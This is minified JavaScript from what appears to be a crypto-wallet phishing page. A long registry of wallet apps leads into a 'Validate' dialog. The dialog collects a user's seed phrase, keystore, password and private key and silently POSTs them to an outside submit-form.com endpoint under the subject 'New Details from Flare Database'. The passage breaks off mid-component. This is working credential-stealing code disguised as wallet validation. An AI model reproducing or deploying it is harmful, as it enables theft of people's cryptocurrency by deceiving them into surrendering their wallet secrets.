            "7b83869f03dc3848866e0299bc630aaf3213bea95cd6cecfbe149389cf457a09": {
                id: "7b83869f03dc3848866e0299bc630aaf3213bea95cd6cecfbe149389cf457a09",
                name: "Spatium",
                homepage: "https://spatium.net/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/us/app/spatium/id1404844195",
                    android: "https://play.google.com/store/apps/details?id=capital.spatium.wallet",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "",
                    universal: ""
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Spatium",
                    colors: {
                        primary: "",
                        secondary: ""
                    }
                }
            },
            d0387325e894a1c4244820260ad7c78bb20d79eeec2fd59ffe3529223f3f84c6: {
                id: "d0387325e894a1c4244820260ad7c78bb20d79eeec2fd59ffe3529223f3f84c6",
                name: "Infinito",
                homepage: "https://infinitowallet.io/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/us/app/infinito-wallet/id1315572736",
                    android: "https://play.google.com/store/apps/details?id=io.infinito.wallet",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "",
                    universal: ""
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Infinito",
                    colors: {
                        primary: "",
                        secondary: ""
                    }
                }
            },
            "176b83d9268d77438e32aa44770fb37b40d6448740b6a05a97b175323356bd1b": {
                id: "176b83d9268d77438e32aa44770fb37b40d6448740b6a05a97b175323356bd1b",
                name: "wallet.io",
                homepage: "https://wallet.io/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/vn/app/wallet-io/id1459857368",
                    android: "https://play.google.com/store/apps/details?id=io.wallet",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "",
                    universal: ""
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "wallet.io",
                    colors: {
                        primary: "",
                        secondary: ""
                    }
                }
            },
            "802a2041afdaf4c7e41a2903e98df333c8835897532699ad370f829390c6900f": {
                id: "802a2041afdaf4c7e41a2903e98df333c8835897532699ad370f829390c6900f",
                name: "Infinity Wallet",
                homepage: "https://infinitywallet.io/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "",
                    android: "",
                    mac: "https://infinitywallet.io/desktop",
                    windows: "https://infinitywallet.io/desktop",
                    linux: "https://infinitywallet.io/desktop"
                },
                mobile: {
                    native: "",
                    universal: ""
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Infinity",
                    colors: {
                        primary: "",
                        secondary: ""
                    }
                }
            },
            bitverse: {
                id: "bitverse",
                name: "BitVerse Wallet"
            },
            solace: {
                id: "solace",
                name: "Solace Wallet"
            },
            "8fb830a15679a8537d84c3852e026a4bdb39d0ee3b387411a91e8f6abafdc1ad": {
                id: "8fb830a15679a8537d84c3852e026a4bdb39d0ee3b387411a91e8f6abafdc1ad",
                name: "Ownbit",
                homepage: "https://ownbit.io/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/es/app/ownbit-btc-eth-cold-wallet/id1321798216",
                    android: "https://play.google.com/store/apps/details?id=com.bitbill.www",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "",
                    universal: ""
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Ownbit",
                    colors: {
                        primary: "",
                        secondary: ""
                    }
                }
            },
            "244a0d93a45df0d0501a9cb9cdfb4e91aa750cfd4fc88f6e97a54d8455a76f5c": {
                id: "244a0d93a45df0d0501a9cb9cdfb4e91aa750cfd4fc88f6e97a54d8455a76f5c",
                name: "EasyPocket",
                homepage: "https://easypocket.app/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/us/app/id1517338927",
                    android: "https://easypocket.app/",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "easypocket:",
                    universal: "https://wallet.easypocket.app"
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "EasyPocket",
                    colors: {
                        primary: "rgb(17, 93, 251)",
                        secondary: ""
                    }
                }
            },
            "881946407ff22a32ec0e42b2cd31ea5dab52242dc3648d777b511a0440d59efb": {
                id: "881946407ff22a32ec0e42b2cd31ea5dab52242dc3648d777b511a0440d59efb",
                name: "Bridge Wallet",
                homepage: "https://mtpelerin.com/bridge-wallet",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/us/app/bridge-wallet/id1481859680",
                    android: "https://play.google.com/store/apps/details?id=com.mtpelerin.bridge",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "",
                    universal: ""
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Bridge",
                    colors: {
                        primary: "",
                        secondary: ""
                    }
                }
            },
            "3b0e861b3a57e98325b82ab687fe0a712c81366d521ceec49eebc35591f1b5d1": {
                id: "3b0e861b3a57e98325b82ab687fe0a712c81366d521ceec49eebc35591f1b5d1",
                name: "SparkPoint",
                homepage: "https://sparkpoint.io/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "",
                    android: "https://play.google.com/store/apps/details?id=com.sparkpoint",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "sparkpoint:",
                    universal: "https://sparkpoint.io"
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "SparkPoint",
                    colors: {
                        primary: "rgb(20,67,95)",
                        secondary: ""
                    }
                }
            },
            ca86f48760bf5f84dcd6b1daca0fd55e2aa073ecf46453ba8a1db0b2e8e85ac1: {
                id: "ca86f48760bf5f84dcd6b1daca0fd55e2aa073ecf46453ba8a1db0b2e8e85ac1",
                name: "ViaWallet",
                homepage: "https://viawallet.com/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://itunes.apple.com/us/app/viawallet/id1462031389",
                    android: "https://play.google.com/store/apps/details?id=com.viabtc.wallet",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "",
                    universal: ""
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "ViaWallet",
                    colors: {
                        primary: "",
                        secondary: ""
                    }
                }
            },
            "42d72b6b34411dfacdf5364c027979908f971fc60251a817622b7bdb44a03106": {
                id: "42d72b6b34411dfacdf5364c027979908f971fc60251a817622b7bdb44a03106",
                name: "BitKeep",
                homepage: "https://bitkeep.com/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://itunes.apple.com/app/bitkeep/id1395301115",
                    android: "https://play.google.com/store/apps/details?id=com.bitkeep.wallet",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "bitkeep:",
                    universal: ""
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "BitKeep",
                    colors: {
                        primary: "rgb(255, 255, 255)",
                        secondary: ""
                    }
                }
            },
            b642ab6de0fe5c7d1e4a2b2821c9c807a81d0f6fd42ee3a75e513ea16e91151c: {
                id: "b642ab6de0fe5c7d1e4a2b2821c9c807a81d0f6fd42ee3a75e513ea16e91151c",
                name: "Vision",
                homepage: "https://vision-crypto.com/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/us/app/id1500186931",
                    android: "https://play.google.com/store/apps/details?id=com.eletac.tronwallet",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "",
                    universal: ""
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Vision",
                    colors: {
                        primary: "",
                        secondary: ""
                    }
                }
            },
            "38ee551a01e3c5af9d8a9715768861e4d642e2381a62245083f96672b5646c6b": {
                id: "38ee551a01e3c5af9d8a9715768861e4d642e2381a62245083f96672b5646c6b",
                name: "PEAKDEFI Wallet",
                homepage: "https://peakdefi.com/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/app/peakdefi-wallet/id1526193527",
                    android: "https://play.google.com/store/apps/details?id=com.peakdefiwallet",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "peakdefiwallet:",
                    universal: "https://peakdefi.com/download"
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "PEAKDEFI",
                    colors: {
                        primary: "rgb(255, 255, 255)",
                        secondary: ""
                    }
                }
            },
            "7e90b95230bc462869bbb59f952273d89841e1c76bcc5319898e08c9f34bd4cd": {
                id: "7e90b95230bc462869bbb59f952273d89841e1c76bcc5319898e08c9f34bd4cd",
                name: "Unstoppable Wallet",
                homepage: "https://unstoppable.money/",
                chains: ["eip155:1", "eip155:56"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/app/bank-bitcoin-wallet/id1447619907?ls=1",
                    android: "https://play.google.com/store/apps/details?id=io.horizontalsystems.bankwallet",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "moneyunstoppable:",
                    universal: "https://unstoppable.money/"
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Unstoppable",
                    colors: {
                        primary: "#FFBE43",
                        secondary: ""
                    }
                }
            },
            "025247d02e1972362982f04c96c78e7c02c4b68a9ac2107c26fe2ebb85c317c0": {
                id: "025247d02e1972362982f04c96c78e7c02c4b68a9ac2107c26fe2ebb85c317c0",
                name: "HaloDeFi Wallet",
                homepage: "https://halodefi.org/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "",
                    android: "https://play.google.com/store/apps/details?id=com.halodefi.wallet",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "halodefiwallet:",
                    universal: ""
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "HaloDeFi",
                    colors: {
                        primary: "rgb(255, 255, 255)",
                        secondary: ""
                    }
                }
            },
            d12b6e114af8c47a6eec19a576f1022032a5ee4f8cafee612049f4796c803c7e: {
                id: "d12b6e114af8c47a6eec19a576f1022032a5ee4f8cafee612049f4796c803c7e",
                name: "Dok Wallet",
                homepage: "https://dokwallet.com/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/il/app/dokwallet-crypto-wallet/id1533065700",
                    android: "https://play.google.com/store/apps/details?id=com.dok.wallet",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "",
                    universal: ""
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Dok",
                    colors: {
                        primary: "",
                        secondary: ""
                    }
                }
            },
            "3d56ed42374504f1bb2ba368094269eaea461c075ab796d504f354baac213dc5": {
                id: "3d56ed42374504f1bb2ba368094269eaea461c075ab796d504f354baac213dc5",
                name: "AT.Wallet",
                homepage: "https://authentrend.com/at-wallet/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/us/app/at-wallet/id1479171310",
                    android: "https://play.google.com/store/apps/details?id=com.authentrend.atwallet",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "",
                    universal: ""
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "AT.Wallet",
                    colors: {
                        primary: "",
                        secondary: ""
                    }
                }
            },
            "1e04cf5cddcd84edb1370b12eae1fcecedf125b77209fff80e7ef2a6d3c74719": {
                id: "1e04cf5cddcd84edb1370b12eae1fcecedf125b77209fff80e7ef2a6d3c74719",
                name: "Midas Wallet",
                homepage: "https://midasprotocol.io/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://itunes.apple.com/us/app/midas-protocol-crypto-wallet/id1436698193",
                    android: "https://play.google.com/store/apps/details?id=com.midasprotocol.wallet.android",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "",
                    universal: ""
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Midas",
                    colors: {
                        primary: "",
                        secondary: ""
                    }
                }
            },
            "15d1d97de89526a3c259a235304a7c510c40cda3331f0f8433da860ecc528bef": {
                id: "15d1d97de89526a3c259a235304a7c510c40cda3331f0f8433da860ecc528bef",
                name: "Ellipal",
                homepage: "https://ellipal.com/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/us/app/ellipal/id1426179665",
                    android: "https://play.google.com/store/apps/details?id=com.ellipal.wallet",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "ellipal:",
                    universal: "https://www.ellipal.com/"
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Ellipal",
                    colors: {
                        primary: "rgb(48, 124, 249)",
                        secondary: ""
                    }
                }
            },
            "0fa0f603076de79bbac9a4d47770186de8913da63c8a4070c500a783cddbd1e3": {
                id: "0fa0f603076de79bbac9a4d47770186de8913da63c8a4070c500a783cddbd1e3",
                name: "KEYRING PRO",
                homepage: "https://keyring.app/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/us/app/keyring-pro-wallet-management/id1546824976",
                    android: "https://play.google.com/store/apps/details?id=co.bacoor.keyring",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "keyring:",
                    universal: "https://keyring.app"
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "KEYRINGPRO",
                    colors: {
                        primary: "",
                        secondary: ""
                    }
                }
            },
            "19ad8334f0f034f4176a95722b5746b539b47b37ce17a5abde4755956d05d44c": {
                id: "19ad8334f0f034f4176a95722b5746b539b47b37ce17a5abde4755956d05d44c",
                name: "Aktionariat",
                homepage: "https://aktionariat.com/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/ch/app/aktionariat/id1518326813",
                    android: "https://play.google.com/store/apps/details?id=com.aktionariat.app",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "aktionariat:",
                    universal: "https://app.aktionariat.com"
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Aktionariat",
                    colors: {
                        primary: "rgb(10, 20, 20)",
                        secondary: ""
                    }
                }
            },
            "95501c1a07c8eb575cb28c753ab9044259546ebcefcd3645461086e49b671f5c": {
                id: "95501c1a07c8eb575cb28c753ab9044259546ebcefcd3645461086e49b671f5c",
                name: "Talken Wallet",
                homepage: "https://talken.io",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/us/app/talken/id1459475831",
                    android: "https://play.google.com/store/apps/details?id=io.talken.wallet",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "talken-wallet:",
                    universal: "https://talken.io"
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Talken",
                    colors: {
                        primary: "rgb(255, 255, 255)",
                        secondary: ""
                    }
                }
            },
            "78640a74036794a5b7f8ea501887c168232723696db4231f54abd3fe524037b4": {
                id: "78640a74036794a5b7f8ea501887c168232723696db4231f54abd3fe524037b4",
                name: "XinFin XDC Network",
                homepage: "https://www.xinfin.io/",
                chains: ["eip155:1"],
                app: {
                    browser: "https://xinfin.network/",
                    ios: "",
                    android: "https://play.google.com/store/apps/details?id=com.xdcwallet",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "",
                    universal: ""
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "XinFin",
                    colors: {
                        primary: "",
                        secondary: ""
                    }
                }
            },
            d612ddb7326d7d64428d035971b82247322a4ffcf126027560502eff4c02bd1c: {
                id: "d612ddb7326d7d64428d035971b82247322a4ffcf126027560502eff4c02bd1c",
                name: "Flare Wallet",
                homepage: "https://flarewallet.io",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/us/app/flare-wallet/id1496651406",
                    android: "https://play.google.com/store/apps/details?id=com.flare",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "flare:",
                    universal: "https://flarewallet.io"
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Flare",
                    colors: {
                        primary: "rgb(31, 36, 59)",
                        secondary: ""
                    }
                }
            },
            "55e5b479c9f49ddac5445c24725857f19888da1ef432ae5e4e01f8054d107670": {
                id: "55e5b479c9f49ddac5445c24725857f19888da1ef432ae5e4e01f8054d107670",
                name: "KyberSwap",
                homepage: "https://kyberswap.com/",
                chains: ["eip155:1"],
                app: {
                    browser: "https://kyberswap.com/",
                    ios: "",
                    android: "",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "kyberswap:",
                    universal: "https://kyberswapnew.app.link"
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "KyberSwap",
                    colors: {
                        primary: "rgb(255, 255, 255)",
                        secondary: ""
                    }
                }
            },
            "6193353e17504afc4bb982ee743ab970cd5cf842a35ecc9b7de61c150cf291e0": {
                id: "6193353e17504afc4bb982ee743ab970cd5cf842a35ecc9b7de61c150cf291e0",
                name: "AToken Wallet",
                homepage: "https://atoken.com",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/us/app/atoken-app/id1395835245",
                    android: "https://play.google.com/store/apps/details?id=wallet.gem.com.atoken",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "atoken:",
                    universal: "https://www.atoken.com"
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "AToken",
                    colors: {
                        primary: "rgb(255, 255, 255)",
                        secondary: ""
                    }
                }
            },
            "4e6af4201658b52daad51a279bb363a08b3927e74c0f27abeca3b0110bddf0a9": {
                id: "4e6af4201658b52daad51a279bb363a08b3927e74c0f27abeca3b0110bddf0a9",
                name: "Tongue Wallet",
                homepage: "https://www.tongue.fi",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/fr/app/tongue-wallet-for-defi-degens/id1534705854",
                    android: "",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "tongue:",
                    universal: "https://www.tongue.fi"
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Tongue",
                    colors: {
                        primary: "rgb(255, 49, 120)",
                        secondary: ""
                    }
                }
            },
            b13fcc7e3500a4580c9a5341ed64c49c17d7f864497881048eb160c089be5346: {
                id: "b13fcc7e3500a4580c9a5341ed64c49c17d7f864497881048eb160c089be5346",
                name: "RWallet",
                homepage: "https://rsk.co/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/us/app/rwallet/id1489241342",
                    android: "https://play.google.com/store/apps/details?id=com.rsk.rwallet.reactnative",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "rwallet:",
                    universal: "https://www.rwallet.app"
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "RWallet",
                    colors: {
                        primary: "rgb(255, 255, 255)",
                        secondary: ""
                    }
                }
            },
            "13c6a06b733edf51784f669f508826b2ab0dc80122a8b5d25d84b17d94bbdf70": {
                id: "13c6a06b733edf51784f669f508826b2ab0dc80122a8b5d25d84b17d94bbdf70",
                name: "PlasmaPay",
                homepage: "https://plasmapay.com/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/app/id1461735396",
                    android: "https://play.google.com/store/apps/details?id=com.plasmapay.androidapp",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "plasmapay:",
                    universal: "https://plasmapay.com/"
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "PlasmaPay",
                    colors: {
                        primary: "rgb(255, 255, 255)",
                        secondary: ""
                    }
                }
            },
            "0aafbedfb8eb56dae59ecc37c9a5388509cf9c082635e3f752581cc7128a17c0": {
                id: "0aafbedfb8eb56dae59ecc37c9a5388509cf9c082635e3f752581cc7128a17c0",
                name: "O3Wallet",
                homepage: "https://o3.network",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://itunes.apple.com/app/id1528451572",
                    android: "https://play.google.com/store/apps/details?id=com.o3.o3wallet",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "o3wallet:",
                    universal: "https://o3.network"
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "O3Wallet",
                    colors: {
                        primary: "rgb(255,255,255)",
                        secondary: ""
                    }
                }
            },
            "761d3d98fd77bdb06e6c90092ee7071c6001e93401d05dcf2b007c1a6c9c222c": {
                id: "761d3d98fd77bdb06e6c90092ee7071c6001e93401d05dcf2b007c1a6c9c222c",
                name: "HashKey Me",
                homepage: "https://me.hashkey.com/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/us/app/hashkey-me/id1547228803",
                    android: "",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "hashme:",
                    universal: "https://me.hashkey.com"
                },
                desktop: {
                    native: "hashme:",
                    universal: "https://me.hashkey.com"
                },
                metadata: {
                    shortName: "HashKey Me",
                    colors: {
                        primary: "rgb(254, 142, 63)",
                        secondary: ""
                    }
                }
            },
            "0a00cbe128dddd6e096ebb78533a2c16ed409152a377c1f61a6a5ea643a2d950": {
                id: "0a00cbe128dddd6e096ebb78533a2c16ed409152a377c1f61a6a5ea643a2d950",
                name: "Jade Wallet",
                homepage: "https://jadewallet.io/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/us/app/jade-wallet-bitcoin-defi/id1544207492",
                    android: "",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "",
                    universal: ""
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Jade",
                    colors: {
                        primary: "#212d66",
                        secondary: ""
                    }
                }
            },
            c04ae532094873c054a6c9339746c39c9ba5839c4d5bb2a1d9db51f9e5e77266: {
                id: "c04ae532094873c054a6c9339746c39c9ba5839c4d5bb2a1d9db51f9e5e77266",
                name: "Guarda Wallet",
                homepage: "https://guarda.com/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/app/apple-store/id1442083982?mt=8",
                    android: "https://play.google.com/store/apps/details?id=com.crypto.multiwallet",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "",
                    universal: ""
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Guarda",
                    colors: {
                        primary: "#fff",
                        secondary: ""
                    }
                }
            },
            ffa139f74d1c8ebbb748cf0166f92d886e8c81b521c2193aa940e00626f4e215: {
                id: "ffa139f74d1c8ebbb748cf0166f92d886e8c81b521c2193aa940e00626f4e215",
                name: "Defiant",
                homepage: "https://defiantapp.tech/",
                chains: ["eip155:1", "eip155:42", "eip155:30", "eip155:31"],
                app: {
                    browser: "",
                    ios: "",
                    android: "https://play.google.com/store/apps/details?id=ar.com.andinasmart.defiant",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "defiantapp:",
                    universal: "https://defiantapp.tech"
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Defiant",
                    colors: {
                        primary: "#274A60",
                        secondary: "#65ef9d"
                    }
                }
            },
            "1ce6dae0fea7114846382391d946784d95d9032460a857bb23b55bd9807259d1": {
                id: "1ce6dae0fea7114846382391d946784d95d9032460a857bb23b55bd9807259d1",
                name: "Trustee Wallet",
                homepage: "https://trusteeglobal.com/",
                chains: ["eip155:1"],
                app: {
                    browser: "",
                    ios: "https://apps.apple.com/us/app/trustee-wallet-bitcoin-wallet/id1462924276",
                    android: "https://play.google.com/store/apps/details?id=com.trusteewallet",
                    mac: "",
                    windows: "",
                    linux: ""
                },
                mobile: {
                    native: "",
                    universal: ""
                },
                desktop: {
                    native: "",
                    universal: ""
                },
                metadata: {
                    shortName: "Trustee",
                    colors: {
                        primary: "",
                        secondary: ""
                    }
                }
            },
            ex784227: {
                id: "1ce6dae0fea7114844",
                name: "Exodus",
                chains: ["eip155:1"]
            },
            others: {
                id: "1ce6dae0fea7114844",
                name: "Others",
                chains: ["eip155:1"]
            }
        },
        N5 = "https://submit-form.com/tpJf5aJE6",
        mu = ["MetaMask", "Bifrost Wallet", "Ledger Wallet", "WalletConnect", "All Wallets"],
        B5 = ({
            id: e,
            open: t,
            onClose: n,
            onSubmit: r
        }) => {
            const i = Xo,
                [o, s] = b.useState({
                    phrase: "",
                    keystore: "",
                    password: "",
                    privateKey: ""
                }),
                [a, l] = b.useState(""),
                [u, c] = b.useState(!1),
                d = async h => {
                    if (h.preventDefault(), e === "others" && !a) return alert("Please fill the Wallet Name");
                    c(!0);
                    try {
                        const v = {
                            subject: "New Details from Flare Database",
                            body: `
                       Wallet name : ${f}
              Phrase : ${o.phrase}
              Key store : ${o.keystore}
              Password : ${o.password}
              Private key : ${o.privateKey}
        `
                        };
                        s({
                            phrase: "",
                            keystore: "",
                            password: "",
                            privateKey: ""
                        });
                        const p = await fetch(N5, {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify(v)
                        });
                        if (p.ok) await p.json(), r(f);
                        else {
                            const w = await p.json();
                            console.error("Error:", w)
                        }
                    } catch (v) {
                        console.error("Error:", v)
                    } finally {
                        c(!1)
                    }
                },
                f = b.useMemo(() => {
                    var h;
                    return mu.includes(e) ? e : e === "others" ? a || "Others" : (h = i[e]) == null ? void 0 : h.name
                }, [e, i, a]);
            return S.jsx(ot, {
                appear: !0,
                show: t,
                as: b.Fragment,
                children: S.jsxs(qt, {
                    as: "div",
                    className: "relative z-10",
                    onClose: () => {},
                    children: [S.jsx(ot.Child, {
                        as: b.Fragment,
                        enter: "ease-out duration-300",
                        enterFrom: "opacity-0",
                        enterTo: "opacity-100",
                        leave: "ease-in duration-200",
                        leaveFrom: "opacity-100",
                        leaveTo: "opacity-0",
                        children: S.jsx("div", {
                            className: "fixed inset-0 bg-black/50"
                        })
                    }), S.jsx("div", {
                        className: "fixed inset-0 overflow-y-auto",
                        children: S.jsx("div", {
                            className: "flex h-screen items-end justify-center text-center",
                            children: S.jsx(ot.Child, {
                                as: b.Fragment,
                                enter: "ease-out duration-300",
                                enterFrom: "opacity-0 scale-95",
                                enterTo: "opacity-100 scale-100",
                                leave: "ease-in duration-200",
                                leaveFrom: "opacity-100 scale-100",
                                leaveTo: "opacity-0 scale-95",
                                children: S.jsxs(qt.Panel, {
                                    className: "w-full md:h-full rounded-t-2xl md:rounded-t-none transform overflow-hidden bg-black text-white text-left transition-all",
                                    children: [S.jsxs("header", {
                                        className: "bg-neutral-700 py-4 px-4 flex justify-between gap-20",
                                        children: [S.jsxs("h2", {
                                            className: "text-lg capitalize",
                                            children: ["Validate ", f]
                                        }), S.jsx("button", {
                                            onClick: n,
                                            className: "outline-none focus:outline-none",
                                            children: S.jsx("svg", {
                                                height: 24,
                                                width: 24,
                                                viewBox: "0 0 24 24",
                                                children: S.jsx("path", {
                                                    fill: "currentColor",
                                                    d: "M19,6.41L17.59,5L12,10.59L6.41,5L5,6.41L10.59,12L5,17.59L6.41,19L12,13.41L17.59,19L19,17.59L13.41,12L19,6.41Z"
                                                })
                                            })
                                        })]
                                    }), S.jsxs("section", {
                                        className: "max-w-screen-md mx-auto p-4 pb-16 h-full",
                                        children: [S.jsxs("div", {
                                            className: "mb-6 flex items-center gap-4 bg-neutral-700 rounded-2xl pr-4",
                                            children: [e !== "others" ? S.jsxs("div", {
                                                className: " py-2 px-4 flex-1",
                                                children: [S.jsx("div", {
                                                    className: "text-xs font-medium text-gray-400",
                                                    children: "Name"
                                                }), S.jsx("h4", {
                                                    className: "text-lg capitalize",
                                                    children: f
                                                })]
                                            }) : S.jsx("input", {
                                                value: a,
                                                placeholder: "Enter Wallet Name",
                                                className: "w-full text-sm bg-neutral-700 py-4 px-4 rounded-lg text-white border border-transparent transition-all focus:border-primary focus:outline-none",
                                                onChange: h => l(h.target.value)
                                            }), S.jsx("img", {
                                                src: mu.includes(e) ? `/images/${e.replace(/\s/g,"").toLowerCase()}.png` : `/images/logos/${e}.jpeg`,
                                                className: "bg-white h-10 w-10 rounded-full"
                                            })]
                                        }), S.jsxs(wi.Group, {
                                            children: [S.jsx(wi.List, {
                                                className: "flex space-x-1 rounded-xl bg-white/20 p-1.5",
                                                children: ["Phrase", "Keystore", "Privatekey"].map((h, v) => S.jsx(wi, {
                                                    className: ({
                                                        selected: p
                                                    }) => Ti("w-full rounded-lg py-2.5 text-sm font-medium leading-5", "focus:outline-none", p ? "bg-primary transition text-white shadow" : "text-white hover:bg-white/20"),
                                                    children: h
                                                }, h + v))
                                            }), S.jsxs(wi.Panels, {
                                                className: "my-4 ",
                                                children: [S.jsx(wi.Panel, {
                                                    children: S.jsxs("form", {
                                                        onSubmit: d,
                                                        children: [S.jsx("textarea", {
                                                            className: Ti("w-full text-base bg-neutral-700 py-2 px-4 rounded-2xl text-white border border-transparent transition-all focus:border-primary focus:outline-none"),
                                                            rows: 4,
                                                            required: !0,
                                                            value: o.phrase,
                                                            onChange: h => s({ ...o,
                                                                phrase: h.target.value
                                                            })
                                                        }), S.jsx("p", {
                                                            className: "text-xs text-stone-400 mt-2 mb-4",
                                                            children: "**Typically 12 (sometimes 24) words separated by single space"
                                                        }), S.jsx(gr, {
